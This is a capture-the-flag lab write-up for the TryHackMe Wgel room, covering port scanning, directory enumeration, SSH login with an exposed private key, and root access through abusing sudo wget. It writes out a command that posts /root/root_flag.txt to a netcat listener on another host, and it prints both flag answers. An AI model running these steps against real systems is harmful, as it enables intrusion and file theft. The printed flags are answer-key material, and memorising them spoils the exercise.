# [Wgel CTF](https://tryhackme.com/room/wgelctf)

> Can you exfiltrate the root flag?

## Scanning

Scan ports using nmap

```bash
nmap -A -T4 10.10.200.215
```

![image](https://user-images.githubusercontent.com/90561566/181027998-0357866b-5df3-48c6-b163-f1d431bc4704.png)

We found 2 open ports 22 (ssh) and 80 (http)

## HTTP

We access the web service by http on port 80

![image](https://user-images.githubusercontent.com/90561566/181027874-748cd312-aa24-459a-a4ac-7b51ef44c820.png)

View source and we can see a announcement on line 278

![image](https://user-images.githubusercontent.com/90561566/181028450-ff1a8df0-6115-4ec3-966c-b453551713ab.png)

"jessie" is name of 1 user on the server

## Enumeration

We use gobuster to enummerate directory on web server

```bash
gobuster dir -u http://10.10.200.215/ -w /usr/share/wordlists/dirb/common.txt -t 30
```

![image](https://user-images.githubusercontent.com/90561566/181032124-78c1f9f4-0bce-4f63-8231-4a7cad25489e.png)

We access to /sitemap/ directory, we find a corporate web

![image](https://user-images.githubusercontent.com/90561566/181033371-2cff1ae6-318d-42f7-9694-90e3d3555d0e.png)

We try gobuster against this page

```bash
gobuster dir -u http://10.10.200.215/sitemap/ -w /usr/share/wordlists/dirb/common.txt -t 30
```

![image](https://user-images.githubusercontent.com/90561566/181034287-2bee7a43-0d83-4d54-9882-df62de22ed14.png)

we found  ".ssh" directory with id_rsa file

![image](https://user-images.githubusercontent.com/90561566/181034614-c1843616-7ac9-44c8-83c6-1deff81801a6.png)

![image](https://user-images.githubusercontent.com/90561566/181034966-d8deb25d-3994-45d2-9126-4b9cefcc5a28.png)

## Exploitation

We can ssh with "jessie" user using id_rsa file

```
wget http://10.10.200.215/sitemap/.ssh/id_rsa
chmod 600 id_rsa
ssh jessie@10.10.200.215 -i id_rsa
```

![image](https://user-images.githubusercontent.com/90561566/181036890-4b5a6609-63bd-4434-a632-566ef3d5c00d.png)

```
find . -name *flag*
```

![image](https://user-images.githubusercontent.com/90561566/181037505-9a8e67b9-a5c0-4ee1-abe4-78ccd5500e4a.png)

| Flag | User flag |
| --- | --- |
| Answer | 057c67131c3d5e42dd5cd3075b198ff6 |

## Privilege Escalation

```
sudo -l -l
```

![image](https://user-images.githubusercontent.com/90561566/181039891-2844e58b-83ea-442c-857a-02f254da3928.png)

Only user/bin/wget allowed as suoder

We we put a netcat listening and use the flag "wget --post-file" to get root flag

```
nc -lvnp 4444
# another terminal
sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.10.149.210:4444
```

And just like that, I got the root_flag.txt

![image](https://user-images.githubusercontent.com/90561566/181043212-652b3629-6fb9-4c64-9abb-506afbae4809.png)

| Flag | Root flag |
| --- | --- |
| Answer | b1b968b37519ad1daa6408188649263d |



















